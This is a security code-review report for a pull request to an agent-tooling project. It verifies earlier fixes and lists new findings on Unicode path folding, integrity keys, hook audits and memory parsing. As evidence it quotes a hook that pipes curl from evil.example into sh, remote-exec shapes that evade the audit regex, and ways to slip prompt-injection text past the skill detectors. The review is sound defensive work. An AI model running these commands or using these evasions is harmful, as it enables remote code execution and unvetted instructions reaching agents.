# Review round 2 — PR #690 (flow 313, W4 portability)

**Scope.** Worktree `/Users/Goodea/goodea/keryx-ape-313-w4`, branch `flow/313-w4`, HEAD `cb09b7b2` (verified). This round covers the round-1 fixes (`8d6638b9..cb09b7b2`, `pr-690-r2-fixes.diff`) and re-checks against the full PR diff (`pr-690-r2.diff`) and the frozen ACs.

- **How findings were confirmed:**
  - Every blocker and major finding was reproduced against the real modules, or against `bun src/cli.ts` in a fresh `git init` project with `KERYX_HOME` pointed at a scratch home.
  - Everything ran on macOS APFS, which is case-insensitive and normalization-insensitive.
- **Where the probes are.** `S2` below means `/private/tmp/claude-502/-Users-Goodea-goodea-keryx/e4ee6e6a-388e-4015-b287-e00b261e73d6/scratchpad/review313-r2`.
  - `S2/bundle/`: bundle core. Holds `mk.ts`, re-runs of `p1`, `p6`, `p6b`, `p7` and `p9`, plus `p1r2`, `p3r2`, `p4r2`, `p6r2`, `p7r2`, `p8`, `p9r2`, `p10`, `p10b`, `pI1`, `porigin`, `rexec`, `vk`, `fold` and `pquad`, and the archives `bomb.tar.gz`, `big.tar.gz` and `w/quad/q.tar.gz`.
  - `S2/ext/`: external catalogs and the audit. Holds `pa`–`pj`.ts.
  - `S2/mem/`: memory and MCP. Holds `p1`, `p2`, `p2b`, `p3` and `p4`.
  - `S2/rules/`: rules-export, integrations and docs. Holds the adapted `forge`, `forge2`, `nl` and `optin` probes, and the scratch projects `cli3`, `cli4`, `cli5`, `sym1`–`sym3`, `distill`, `orph`, `bB`, `bC` and `zb`.
  - Each lane also left a `REPORT.md` in its directory.
- **Repo state:** nothing was edited, staged or committed. `keryx ctx` wrote logs under the gitignored `.metaproject/data/gdctx/`, and `git status` is clean.

**Suites.** `bun test src/bundle src/commands/bundle.test.ts src/security/audit-harness src/memory src/mcp src/integrations src/rules src/lib src/gdskills/governance src/wiki src/cli.test.ts src/cli-reference-coverage.test.ts src/core-package.test.ts` gives 3423 pass, 4 skip, 22 fail in 59.4 s.

- **The 22 failures are environmental.** All of them are in files this PR does not touch: `src/lib/git-hooks.test.ts` (2), `src/lib/security-pre-push.test.ts` (1), and `src/wiki/{freshness,refresh,source-gate,staleness}` (19).
  - Every one fails on the global hook that refuses author email `test@test.com`.
  - With `GIT_AUTHOR_EMAIL` and `GIT_COMMITTER_EMAIL` set to the expected address, 122 of 123 pass. The remaining failure is the pre-push hook test, again environmental.
- **Typecheck:** `bunx tsc --noEmit -p .` is clean (12.6 s).
- **Test cost:** the new tests are cheap. `archive.test.ts` takes 0.7 s at 116 MB RSS (the gzip-bomb test does not allocate the bomb). `external.test.ts` and `scout.test.ts` take about 0.3 s each. The memory and MCP set runs 1320 tests in 9.2 s at 244 MB.

**Counts (new findings):** 0 blocker, 8 major, 13 minor, 6 info (grouped).
**Round 1 (29 findings):** 20 resolved, 8 partial, 1 unresolved. R1-I1 is resolved.

---

## Round-1 verification

- **R1-F1: partial.**
  - Fixed: an identical entry with no ledger record is no longer claimed. Re-running `p1.ts` shows the user's pre-existing `rules/mine.md` survives uninstall. Test: `apply.test.ts` "R1-F1: identical-entry ledger ownership".
  - Still open: an *update*-bucket entry still takes over another bundle's managed file. See R1-F1 in the JSON (`S2/bundle/p1r2.ts` case 1).
- **R1-F2: unresolved.**
  - Fixed: the exact ASCII case variant, the NFD variant and a registry written directly are now refused. Tests in `paths.test.ts` and `external.test.ts`.
  - Still open: `skills/external-importſ.json` (U+017F LATIN SMALL LETTER LONG S) reaches the canonical registry on APFS, because `caseFold` = NFC + `toLowerCase` does not fold `ſ`.
  - The HMAC key sits in the bundle-writable `skills/` tree and is not reserved. On a home with no key yet, a bundle can plant both the key and the registry, and then `verify --external-imports` reports ok and scout lists the unvetted skill (`S2/ext/pa.ts longs`, `pg.ts`).
  - The `paths.test.ts` "Unicode-normalization variant" test has a third case that equals the canonical name, so it tests nothing Unicode.
- **R1-F3: resolved.**
  - `memory.propose` refuses LF, CRLF, lone CR, U+2028, U+2029, VT and FF in `title`, and CLI `memory new` does too (`S2/mem/p1.ts`).
  - Tests: `memory-harness-identity.test.ts` (title injection), `templates.test.ts`, `store.test.ts`.
- **R1-F4: resolved.**
  - `memory.search`, `memory_search`, `wiki.ask`, `wiki_ask`, `wiki.evidence` and the resource list and read are all filtered (`S2/mem/p2.ts`).
  - Tests: `metaproject-tools.test.ts`, `memory-harness-identity.test.ts`, `wiki/ask.test.ts`.
  - The leaks that remain come from parsing: see R2-F5 and R2-F14.
- **R1-F5: partial.**
  - Fixed: a mode-000 root, a mode-000 file, symlinks, non-UTF-8 bytes and a root that is a regular file all yield `incomplete`. Tests in `handoff.test.ts` and `store.test.ts`.
  - Still open: a root at mode 0300 (executable but not readable) still reports `complete` and misses unexpected entries (`store.ts:287-293`).
  - The CRLF-drop case is covered by R2-F5.
- **R1-F6: resolved.** `S2/ext/pb.ts` shows `f6-inj` and `f6-mjs` rejected as `audit-failed`, and a clean markdown-only skill accepted. Tests: `scout.test.ts`, `external.test.ts`, `audit-harness.test.ts`.
- **R1-F7: resolved.**
  - `forge`, `forge2` and `nl` (adapted to the `{rules, skipped}` return) now skip unsafe names. `forge2` shows the human text preserved.
  - `ensureMetaprojectReference` refuses an unterminated block instead of truncating.
  - `normalizeBundlePath` rejects `<!--`, `-->` and control characters.
  - Tests: `export-render.test.ts` "F7: unsafe rule paths are skipped, not rendered"; `agent-entrypoints.test.ts` "refuses, leaving the file byte-identical…" and "a forged/orphaned start marker … aborts the sync".
  - Side effects: R2-F6 and R2-F15.
- **R1-F8: resolved.**
  - Every skill text file is now audited, and check selection is case-insensitive (`S2/ext/pe.ts`). Tests in `imported-bundles.test.ts`.
  - Residual: `ſKILL.md` passes the casing rule at `paths.ts:149`; see R2-F1.
- **R1-F9: partial.**
  - Fixed: `../` keys, symlinked parents and a symlinked scope root are refused. Tests in `uninstall.test.ts`.
  - Still open: ledger keys are checked neither against their kind's path shape nor case-folded. A planted record deletes `.metaproject/index.md`, and a `RULES/A.MD` key deletes another bundle's `rules/a.md` (`S2/bundle/p7r2.ts`).
- **R1-F10: resolved.**
  - `bomb.tar.gz` is refused in 0.23 s at 365 MB RSS; round 1 measured 20.6 s at 2.5 GB. The directory source is capped.
  - Tests: `archive.test.ts` gzip-bomb and entry-count.
  - Caveats are in R2-I4.
- **R1-F11: resolved.** Inspect after import reports identical, and re-import reports unchanged. Test in `plan.test.ts`. There is a side effect: R2-F19.
- **R1-F12: resolved, but no regression test.**
  - Agent origin is forced to `imported`, including flow-style, quoted and spaced variants (`S2/bundle/porigin.ts`).
  - A schema-invalid learned pattern or hook config is refused as `content-invalid`.
  - See R2-F21 for the missing test.
- **R1-F13: partial.**
  - Fixed: `scope-mismatch` and `hooks-require-opt-in` are refused (`S2/bundle/p9r2.ts`).
  - Still open:
    - The remote-exec check never runs on any hook the import path accepts (R2-F3).
    - The regex misses 14 common shapes (`S2/bundle/rexec.ts`).
    - Every plan test passes `allowHooks: true`, so there is no plan-level opt-in test.
- **R1-F14: resolved.** An invalid list matches no harness and is excluded from the strict entries (`S2/mem/p4.ts`). Tests exist.
- **R1-F15: resolved.** `lstat` refusal for the file and the directory (`S2/mem/p3.ts` G1, G2, G5). `private-dir.test.ts` now has a symlink to identical content.
- **R1-F16: resolved, but no regression test.** Too-deep, too-many and too-large candidates are rejected in behaviour, but no test asserts it (R2-F21).
- **R1-F17: partial.**
  - Fixed: vetting hashes and audits one snapshot (`external.ts:353,:393,:406`). Appended bytes are detected as `checksum-mismatch`, and scout re-verifies.
  - Still open: a symlink added after acceptance is invisible to verify and scout. See R1-F17 in the JSON.
  - There is no test of the single-snapshot change itself.
- **R1-F18: resolved.** Duplicate names are rejected. Test in `external.test.ts`.
- **R1-F19: resolved.**
  - The new `rules` flag works: `--surface instructions` installs and uninstalls only the pointer, and `--surface rules` works on all 7 rules-export harnesses. `integrations matrix --check` passes.
  - Install state written by earlier builds of this branch (rules-export recorded under `instructions`) is harmless, and `surfaces-rules.ts` has never shipped on main.
  - Tests: `rules-export.test.ts` (3 tests), `w5b-adapters.test.ts`.
- **R1-F20: partial.**
  - Fixed: markdown-block refuses symlinks (`optin.ts` part D). Test: `markdown-block.test.ts` "F20: …".
  - Still open: `ensureMetaprojectReference` and the JSON settings surfaces still write outside the project through symlinks.
  - The new refusal is also too broad (R2-F8).
- **R1-F21: resolved.** `p6b` and `p6r2` show an empty snapshot diff after rollback, and the reason is now named. Test in `apply.test.ts`.
- **R1-F22: partial.**
  - Fixed: file/directory prefix collisions and ASCII or NFD duplicate paths are refused.
  - Still open: `rules/s.md` plus `rules/ſ.md` both import, and the second overwrites the first (`S2/bundle/p10b.ts`). There is no `manifest.test.ts` case.
- **R1-F23: resolved, but no regression test.** The id is a content digest, so two projects without remotes get distinct ids.
- **R1-F24: resolved, but no regression test.** Importing from `src/deep` writes the root `.metaproject/`.
- **R1-F25: resolved.** A project-scope accepted pattern is rewritten to a candidate. Test in `plan.test.ts`.
- **R1-F26: resolved** for the `## bundle` section.
  - JSON key order, the refusal names (all present in `BUNDLE_REFUSAL`, `src/bundle/types.ts:68-95`), `--allow-hooks`, the default bundleId and the zero-bytes claim were all checked against the CLI.
  - Other doc errors remain (R2-F17).
- **R1-F27: resolved.** A named refusal for an unreadable `.gitignore`. The strict scan uses `lstat`, fatal UTF-8 and unexpected-file problems (`S2/mem/p3.ts` S2–S5, S9, S11, S12). Tests exist.
- **R1-F28: partial.**
  - Fixed: a rules render failure now exits 1 with `ok: false` (`src/commands/bundle.ts:372,387,400`), though no test covers it. Symlinked candidates are refused, and tested.
  - Still open:
    - A file with no final newline still gains `\n`, and a whitespace-only file is deleted.
    - The verify-side `collectFiles` (`external.ts:287-303`) has no caps and skips symlinks and unreadable directories silently.
    - A retry after a render failure skips rendering (R2-F16).
- **R1-F29: resolved.** There is a `corrupt-ledger` reason, the plan-time ledger is carried into apply, and a ledger-write failure rolls back. Tests exist.
- **R1-I1: resolved** (`S2/bundle/pI1.ts`). Only the scope-root case is tested, and the ledger path itself is unchecked (R2-I4).

---

## New findings

### Majors

#### R2-F1 — major — Unicode case folding misses U+017F `ſ`, an APFS alias of `s`, so every reserved-path, casing and duplicate guard can be bypassed
- **File:** `src/bundle/paths.ts:101-103` (`caseFold` = `normalize("NFC").toLowerCase()`). The same fold, or none, is used at `paths.ts:121-125` and `:149`, `manifest.ts:72`, `external.ts:164-171`, and for uninstall ledger keys.
- **Mechanism:**
  - JS `"ſ".toLowerCase()` is `ſ`, but APFS treats `ſ` as `s`.
  - The only other single-character alias, U+212A KELVIN, is already folded by JS.
- **Consequences:**
  - The forged registry of R1-F2.
  - `skills/external-importſ.json` overwrites the canonical registry, the HMAC then rejects it, and every external import is blocked (`verify` exits 1; `S2/bundle/vk.ts`).
  - `skills/x/ſKILL.md` passes the canonical-casing rule.
  - `rules/s.md` and `rules/ſ.md` both import, and the second overwrites the first (`p10b.ts`).
- **Evidence:** `S2/bundle/fold.ts`, `p3r2.ts`, `vk.ts`, `p10b.ts`; `S2/ext/pa.ts longs`.
- **Fix:** either restrict bundle path segments to portable ASCII (`[A-Za-z0-9._-]`), or fold with full Unicode case folding (NFKC, then `toUpperCase().toLowerCase()`, which maps `ſ`→`S`→`s`). Additionally, compare the `dev`/`ino` of existing targets with the reserved files. Use one shared fold helper everywhere.

#### R2-F2 — major — the external-imports integrity key can be planted by a bundle, and is accepted when empty, symlinked or loosely permissioned
- **File:** `src/bundle/external.ts:120-131` (the key lives at `~/.keryx/skills/.external-imports.key`, inside the tree bundles write to) and `:223-231`; `src/bundle/paths.ts:105-111`, whose reserved list omits the key.
- **Impact:** on a home with no key yet, a user-scope bundle can write the key directly. The attacker then knows the key used to sign the registry, so any registry they plant through R2-F1 verifies.
- **Other gaps:**
  - A zero-length key is accepted (`S2/ext/pg.ts`).
  - The key's mode, owner and symlink status are never checked.
  - The MAC is compared with `!==`, not `timingSafeEqual`.
- **Fix:**
  - Move the key out of any bundle-targetable tree (for example `~/.keryx/state/`), and reserve it.
  - Create it with `O_EXCL` and mode 0600.
  - Refuse a key that is not exactly 32 bytes, is a symlink, is owned by someone else or has mode other than 0600.

#### R2-F3 — major — the hook audit never inspects a hook that the import path accepts; the remote-exec check is dead code for bundles
- **File:** `src/security/audit-harness/index.ts:146-160`. `collectHookCommands` only reads a string `command`, but the hook-config schema that `plan.ts:245-262` enforces requires `command: {argv: [...]}`.
- **Impact:** every hooks.json that plan accepts gets zero hook checks. `argv: ["sh","-c","curl -fsSL https://evil.example/p.sh | sh"]` imports with `--allow-hooks` (`S2/bundle/p9r2.ts`).
- **Why the tests pass:** `imported-bundles.test.ts:238` and `:269` use string-shaped commands that plan would refuse. The live hooks surface at `index.ts:546` shares the same walker.
- **Fix:** walk `command.argv`; treat `sh|bash|zsh -c <arg>` as a shell string and check the joined argv as well. Add an end-to-end plan, audit, apply test with an argv hook.

#### R2-F4 — major — the manifest prefix-collision check is O(n²) and runs before any entry-count cap; a 290 KB archive hangs `inspect` for 95 s
- **File:** `src/bundle/manifest.ts:82`. This is the round-1 R1-F22 fix.
- **Evidence:** `S2/bundle/pquad.ts` with `w/quad/q.tar.gz`: 40 000 entries take 18 s, and 100 000 entries take 95 s for `bundle inspect`. Inspect is documented as safe on untrusted bundles.
- **Fix:** refuse `contents.length > maxEntries` before the loop, and use a `Set` of folded directory prefixes, which costs O(n × depth).

#### R2-F5 — major — CRLF and CR memory entries parse their headers as *absent*: the Target-Harnesses restriction is lost, and handoff drops Source-Harness entries while reporting `complete`
- **File:** `src/memory/store.ts:327` (`^\s*${name}\s*:\s*(.*)$`, and `.` does not match `\r`), `:208` and `:349` (split on `"\n"` only), `:466` (`field`) and `:477` (`bulletField`).
- **Evidence:** `S2/mem/p2.ts` prints `resources list claude LEAKS: ["codex-crlf","codex-cr"]`, and the resource read returns the secret text. In `p3.ts` S10, a CLI handoff reports `complete`, exit 0, with only the LF entry.
- **Impact:** AC6 and AC7 fail for any Windows-authored or git-autocrlf memory file. `Status` is also unparsed, so the entry is treated as a draft.
- **Fix:** normalise `\r\n` and lone `\r` to `\n` once at the top of `parseEntry` and `collectEntriesStrict`, or split on `/\r\n|\r|\n/`. Add CRLF and CR fixtures to `store.test.ts` and `handoff.test.ts`.

#### R2-F6 — major — a rule with an unsafe name makes rules-export report `failed` (exit 1) while the block is still written and no install state is recorded; dry-run predicts success
- **File:** `src/integrations/surfaces-rules.ts:64-67`, which merges skipped-rule messages into the error list, and `installer.ts:464-468`, where any error skips `recordSurfaceInstalled`.
- **Evidence:**
  - `S2/rules/cli3`: rules `a.md` and `x<!--/y.md`, then `integrations install --runtime claude --surface rules`, gives exit 1 and `✗ rules-export … failed`. `CLAUDE.md` nevertheless holds the full block, and no `install-state/` exists.
  - `S2/rules/cli5`: `--dry-run` says `would-install`, exit 0.
- **Impact:**
  - `installedRulesExportHarnesses` never lists the harness, so `bundle import` never refreshes the block.
  - Doctor hides it. If a record already existed, doctor reports it `invalid`.
- **Fix:** report skipped rules as warnings and install and record the surface; or refuse before writing anything. Make `inspectRulesExport` account for `skipped`.

#### R2-F7 — major — `keryx rules distill` splits the `keryx:rules` block, leaving an orphan start marker that blocks rules-export from then on
- **File:** `src/rules/distill.ts:92-102` (`stripManagedBlock` only knows `keryx:index`), `:104-133` and `:199-207`.
- **Evidence:** `S2/rules/distill`: `init`, then `install --surface rules`, then `rules distill` (exit 0).
  - `CLAUDE.md` ends with a lone `<!-- keryx:rules -->`.
  - The list and the end marker moved into `project-skills/entrypoints/claude-md-project-rules-keryx/SKILL.md`.
  - A re-install gives `unterminated <!-- keryx:rules --> block`, and doctor reports `invalid` with exit 0.
  - Also, `syncAgentRules` copies the rules block into `.metaproject/rules/claude-md.md`, which then indexes itself.
- **Fix:** carry every `keryx:*` managed block through distill and sync unchanged, and exclude them from section splitting.

#### R2-F8 — major — the new symlink refusal also blocks symlinks that stay inside the repo, breaking the default `instructions` install and leaving it half-applied
- **File:** `src/integrations/markdown-block.ts:118-135`. `refuseSymlinkChain` refuses any symlink segment regardless of where it resolves; it is used by install (`:402`), uninstall (`:466`) and inspect (`:509`).
- **Evidence:** `S2/rules/sym1`, with `GEMINI.md -> AGENTS.md`: the default `integrations install --runtime gemini-cli` exits 1 after `.gemini/settings.json` was already written.
  - `.github/copilot-instructions.md -> ../AGENTS.md` fails the same way (exit 1).
  - claude with `CLAUDE.md -> AGENTS.md` fails `--surface rules`.
- **Why it matters:** `CLAUDE.md -> AGENTS.md` is a common layout, and this is a regression against main. The behaviour is also inconsistent, because `keryx init` still writes through the same link.
- **Fix:** resolve the realpath and refuse only when it leaves the project root, or when it lands on another harness's managed file. Check every target before writing any of them.

### Minors

#### R2-F9 — minor — concurrent `bundle import --external` runs lose registry updates
- **File:** `src/bundle/external.ts:463-479`: read, modify, then rename, with no lock.
- **Evidence:** `S2/ext/pd.ts`: in 9 of 15 trials only one of two concurrent imports was recorded.
- **Fix:** take a `wx` lock file, or re-read and merge under the lock before the rename.

#### R2-F10 — minor — the auto-run and injection text checks can be evaded
- **File:** `src/security/audit-harness/checks.ts:69-75` and `src/security/detect/injection.ts`.
- **What evades them:** zero-width characters, a soft hyphen (U+00AD), Cyrillic homoglyphs, full-width text, NFD forms and HTML entities.
- **Evidence:** `S2/ext/pc.ts`; `pb.ts` accepts `byp-soft-hyphen` and `byp-md-entity`.
- **Fix:** before matching, apply NFKC, strip default-ignorable characters, decode entities and map confusables.

#### R2-F11 — minor — JSON-kind entries are checked as serialized text, so an escaped `\n` hides an auto-run directive
- **File:** `src/security/audit-harness/index.ts:338-356`.
- **Evidence:** `S2/ext/pi.ts`: a learned-pattern `action` containing `\n`-escaped text imports.
- **Fix:** for JSON kinds, parse the document and check every string value.

#### R2-F12 — minor — audit text detection gives false positives that reject legitimate skills
- **File:** `src/security/audit-harness/index.ts:172-180` (`isTextContent`) and `checks.ts:59-72`.
- **Binary assets:** a PNG or a UTF-16 file rejects the whole skill. External vetting reports this as a misleading `audit-not-applicable`, and bundle import reports `audit-incomplete`, so skills with images cannot round-trip.
- **Documentation text:** ordinary docs such as `curl -fsSL … | sh`, `| python3 -m json.tool`, `| node -e`, or `fetch … | bash-completion` are flagged high (`S2/ext/pj.ts`: 5 of 7).
- **BOM and CRLF:** UTF-8 with BOM and CRLF text are *not* rejected by the skill audit (`S2/ext/pb.ts`, the bytes-* fixtures). An agent with a BOM or CRLF is refused `content-invalid` at plan (R2-I4).
- **Fix:**
  - Allow known binary types by magic bytes, recorded as hashed but unscanned under a distinct reason.
  - Rate remote-exec inside fenced code or prose as medium.
  - Drop the bare `fetch` alternative.

#### R2-F13 — minor — one unreadable file aborts a whole external vetting batch, while an unreadable directory or a FIFO is skipped silently
- **File:** `src/gdskills/governance/scout.ts:661` (uncaught EACCES), `:636-640` and `:653`.
- **Evidence:** `S2/ext/pb.ts` (the `perm-dir` case is accepted).
- **Fix:** a named per-candidate `unreadable` rejection.

#### R2-F14 — minor — a hand-authored `Target-Harnesses:` line below the first `##` heading is ignored, so the entry is visible to every harness
- **File:** `src/memory/store.ts:338-341` and `:213-228`.
- **Fix:** treat a Source- or Target-Harnesses line outside the header block as invalid (hidden, and reported as an `invalid-*` problem), not as absent.

#### R2-F15 — minor — `keryx init` and `rules sync` abort partway on a marker merely mentioned in prose, and don't name the file
- **File:** `src/rules/agent-entrypoints.ts:143` (substring `indexOf`) and `:157-160`.
- **Evidence:** in `S2/rules/orph`, `init` exits 1, leaves a half-built `.metaproject/` and `AGENTS.md`, and the message omits `CLAUDE.md`.
- **Fix:** match markers only as whole lines, check entrypoints before scaffolding, and name the file in the error.

#### R2-F16 — minor — re-running an import after a render failure reports success without rendering
- **File:** `src/commands/bundle.ts:360-365`, which renders only when `writtenRuleEntries.length > 0`.
- **Evidence:** `S2/rules/bC`: after a failure and `rm CLAUDE.md`, the re-import exits 0 and no `CLAUDE.md` is written. Human output never prints the render failure's messages.
- **Fix:** render whenever `--render-for` is given, and print the messages.

#### R2-F17 — minor — remaining doc inaccuracies
- **`docs/docs/integrations.md:259-261`:** "restores the surrounding file exactly" is false for a file with no final newline and for a whitespace-only file.
- **`integrations.md:261-264`:** omits unsafe-path skipping and the symlink refusal.
- **`integrations.md:239-243`:** leaks internal review wording ("Review round 1, F19").
- **`src/commands/integrations.ts:518`:** "Omit to select every surface" is wrong, because opt-in `agents` and `rules` are excluded.
- **Fix:** correct the text.

#### R2-F18 — minor — `bundle export` with zero matching entries succeeds but writes a bundle that cannot be imported
- **File:** `src/bundle/export.ts`.
- **Evidence:** `export --scope user --kind hook-config,memory-entry` reports `ok: true`, `entries: 0`, and bundleId `keryx-user-e3b0c44298fc` (the sha256 of an empty string). Importing it gives `schema-invalid $.contents`.
- **Fix:** refuse an empty export.

#### R2-F19 — minor — the deterministic TTL is derived from `createdAt`, so a bundle older than 30 days imports learned patterns that have already expired
- **File:** `src/bundle/plan.ts:85-90`.
- **Fix:** use `max(createdAt, now) + 30d`, and treat a difference in `ttl` alone as identical.

#### R2-F20 — minor — a non-ENOENT error is treated as "absent", so an unreadable user file is planned `new`, overwritten, and deleted on rollback
- **File:** `src/bundle/plan.ts:108-115` (`currentFileSha` swallows every error), `apply.ts:49-56` and `:157-161` (`previousBytes` is null on EACCES), `uninstall.ts:109-120`.
- **Evidence:** `S2/bundle/p8.ts`, with a mode-000 user file.
- **Fix:** only ENOENT means absent; any other error refuses with a named reason.

#### R2-F21 — minor — several round-1 fixes have no regression test
- **Missing tests:**
  - R1-F12 (agent origin, and content validation at import).
  - R1-F13 (plan-level `hooks-require-opt-in` and `scope-mismatch`; every plan test passes `allowHooks: true`).
  - R1-F16 (depth, count and size caps).
  - R1-F17 (single-snapshot vetting).
  - R1-F22 (`manifest.test.ts` case-fold and prefix duplicates).
  - R1-F23 (distinct ids without a remote).
  - R1-F24 (subdirectory import).
  - R1-F28 (render failure exits 1; `bundle.test.ts` only asserts exit 0).
- **Existing test that proves nothing:** the third case of the `paths.test.ts` Unicode test equals the canonical name.
- **Fix:** add these tests. Each one should fail on `8d6638b9`.

### Info

- **R2-I1 — memory and MCP.**
  - The guard and the parser disagree on leading whitespace: `templates.ts:22` and `tools.ts` use `[ \t]*`, while `store.ts:327` uses `\s*`. Harmless today.
  - `visibility.get(path) ?? true` fails open by default (`tools.ts` ~155, `metaproject-tools.ts:55`); the default should be false.
  - `memory/index.md` is no longer listed as an MCP resource. Check whether that is intended.
  - The `sac.review` dedup hint reads the unfiltered `collectEntries` (`decision-dedup.ts:195`, `proposal-lifecycle.ts:313`); reaching it needs a confirm token.
  - `private-dir` only `lstat`s the last path component, so a symlinked parent is accepted (G6), and there is a check-then-`mkdir` window.
  - The `renderReviewNote` title is unguarded (`review-notes.ts:205,209`).
  - The `filterEntriesForHarness` doc comment is wrong (`service.ts:291`).
- **R2-I2 — external registry.**
  - There is a transient race where the key is read while still zero-length (`external.ts:142-148`).
  - The MAC covers neither `schemaVersion`, extra fields nor a version counter, so an older valid registry can be replayed.
  - The staging directory is on a case-insensitive filesystem (`scout.ts:696-700`), which may collapse `a.md` and `A.md`. Untested.
- **R2-I3 — rules.**
  - U+2028, U+0085 and full-width `＜!--` in rule names pass through unchanged. They cannot forge a marker, because markers match exactly.
  - `distill.ts:101` still truncates on an unterminated block, but that path is now unreachable.
  - There is a time-of-check to time-of-use window between `refuseSymlinkChain` and `writeFile`.
- **R2-I4 — bundle core.**
  - A shared identical file is owned only by the bundle that wrote it.
  - `inspect.ts:62` forces `allowHooks: true`, so inspect says "ok" for a bundle that a plain import refuses.
  - A 1.1 MB archive holding a 250 MB entry reaches 812 MB RSS, because `parseUstar` makes an extra copy.
  - The bomb is reported as `archive-invalid`, not `archive-too-large`.
  - `readOctal` accepts a negative size.
  - The directory walk counts neither directories nor depth.
  - The injectable limits are not clamped.
  - `writeAppliedState` follows a symlinked `data/bundles`.
  - `resolveProjectRoot` stops at any `.git`, so a dotfiles repo in `~` resolves to `~/.metaproject`.
  - An agent with a BOM or CRLF is refused `content-invalid`. That may be a false positive for Windows-authored agents; it was not confirmed as a bug.
- **R2-I5 — install state.** Records from earlier builds of this branch with `surface: "instructions"` are harmless: records are keyed by `moduleId` (`S2/rules/cli4`).
- **R2-I6 — suites.** The 22 local failures are environmental: the global author-email hook, in files this PR does not touch. tsc is clean.

```json keryx:findings
[
{"id":"R1-F1","severity":"major","title":"update bucket still re-owns another bundle's managed file (identical-claim part fixed)","file":"src/bundle/plan.ts","line":329,"class":"ledger ownership transferred without consent","impact":"bundle B overwrites and takes ownership of bundle A's file without conflict or --force; A's uninstall forgets it, B's uninstall deletes it; content-digest ids make every re-export a new owner","suggested_fix":"when ledgerRecord.bundleId !== manifest.bundleId, bucket as conflict 'owned-by-other-bundle' requiring --force; consider a stable per-source bundle id","evidence":"S2/bundle/p1r2.ts case 1; apply.ts:196-204 rewrites the record's bundleId","confidence":"high","class_scope":{"sites":["src/bundle/plan.ts:329-330","src/bundle/plan.ts:339","src/bundle/apply.ts:196-204"],"enumeration_method":"read every ledger-record write in apply.ts and every bucket decision in plan.ts"}},
{"id":"R1-F2","severity":"blocker","title":"forged vetted external-imports registry still reachable: U+017F alias path plus bundle-planted integrity key","file":"src/bundle/paths.ts","line":101,"class":"incomplete case folding on a case/normalization-insensitive FS; integrity key in attacker-writable tree","impact":"a user-scope bundle on a home without a key writes skills/.external-imports.key and skills/external-importſ.json; verify --external-imports reports ok and scout lists an unvetted skill (AC9 bypass)","suggested_fix":"restrict path segments to portable ASCII or full Unicode case folding; move and reserve the key outside bundle-writable trees, O_EXCL 0600, refuse wrong length/symlink/owner/mode","evidence":"S2/ext/pa.ts longs; S2/ext/pg.ts; S2/bundle/fold.ts, vk.ts","confidence":"high","class_scope":{"sites":["src/bundle/paths.ts:101-103","src/bundle/paths.ts:105-111","src/bundle/paths.ts:149","src/bundle/external.ts:120-131","src/bundle/external.ts:165-171","src/bundle/external.ts:223-231"],"enumeration_method":"keryx ctx rg caseFold|toLowerCase over src/bundle; APFS alias scan over all BMP code points (fold.ts)"}},
{"id":"R1-F5","severity":"minor","title":"memory root at mode 0300 still reports complete; unexpected entries missed","file":"src/memory/store.ts","line":287,"class":"error swallowed as already-reported","impact":"AC7 smaller-result-labelled-complete for a traversable but unreadable root","suggested_fix":"push {path:'.',reason:'unreadable-folder'} on any non-ENOENT readdir(root) failure","evidence":"S2/mem/p3.ts (0300 root: status complete, exit 0)","confidence":"high"},
{"id":"R1-F9","severity":"minor","title":"ledger keys not validated against kind path shapes nor case-folded at uninstall","file":"src/bundle/uninstall.ts","line":96,"class":"unvalidated ledger path used for a destructive operation","impact":"a planted ledger deletes .metaproject/index.md; a RULES/A.MD key deletes another bundle's rules/a.md on APFS","suggested_fix":"validateKindPath(record.kind, scope, key); refuse folded collisions with other bundles' keys","evidence":"S2/bundle/p7r2.ts","confidence":"high"},
{"id":"R1-F13","severity":"minor","title":"remote-exec hook regex misses 14 common shapes; no plan-level opt-in tests","file":"src/security/audit-harness/checks.ts","line":418,"class":"audit shape gap","impact":"| sudo -E bash, | /bin/bash, | env bash, bash -lc \"$(curl)\", source <(curl), iwr|iex etc. pass (the check is also dead on the import path, R2-F3)","suggested_fix":"allow optional path/env/VAR=/sudo before the interpreter, -[a-z]*c, backticks, source/. with process substitution, iex/DownloadString; add plan tests without allowHooks","evidence":"S2/bundle/rexec.ts (14 MISSED)","confidence":"high"},
{"id":"R1-F17","severity":"major","title":"symlinks added after acceptance are invisible to verify and scout","file":"src/bundle/external.ts","line":287,"class":"unverified reference use","impact":"a symlinked reference.md, scripts dir or sourceRef added after vetting is never audited or hashed; verify ok, scout lists the skill","suggested_fix":"verifyExternalImports re-runs collectSkillDirectorySnapshot(record.sourceRef) (lstat, refuse symlinks, caps) and compares the file map exactly; add status symlink-refused","evidence":"S2/ext/pf.ts [symlink-file] [symlink-dir] [sourceref-symlink]","confidence":"high","class_scope":{"sites":["src/bundle/external.ts:287-303","src/bundle/external.ts:499","src/bundle/external.ts:519-552","src/gdskills/governance/scout.ts scoutImports"],"enumeration_method":"read every consumer of the recorded sourceRef in external.ts and scout.ts"}},
{"id":"R1-F20","severity":"major","title":"JSON settings surfaces and ensureMetaprojectReference still write through symlinks outside the project","file":"src/rules/agent-entrypoints.ts","line":82,"class":"symlink-following write","impact":"a planted .claude, .github or CLAUDE.md symlink redirects Keryx writes to arbitrary outside paths","suggested_fix":"realpath-inside-root containment in the settings merge writer, ensureMetaprojectReference and writeTextIfChanged","evidence":"S2/rules/sym3 (.claude -> outclaude: settings.json written, exit 0); sym1 (.github -> outgh/hooks/keryx-ctx-guard.json); sym2 (rules sync rewrites outside-claude.md)","confidence":"high","class_scope":{"sites":["src/integrations/installer.ts settings merge/strip for every hook surface","src/rules/agent-entrypoints.ts:93","src/rules/agent-entrypoints.ts:99","src/rules/agent-entrypoints.ts:185-199","src/rules/distill.ts:205"],"enumeration_method":"CLI probes with symlinked parents/files for claude, github-copilot-agent and rules sync; read every fs write in installer.ts and src/rules"}},
{"id":"R1-F22","severity":"minor","title":"s/ſ duplicate paths both import, second overwrites first; no manifest.test.ts case","file":"src/bundle/manifest.ts","line":72,"class":"incomplete duplicate check","impact":"one file written under two ledger keys","suggested_fix":"share the fixed fold helper (R2-F1); add manifest tests","evidence":"S2/bundle/p10b.ts","confidence":"high"},
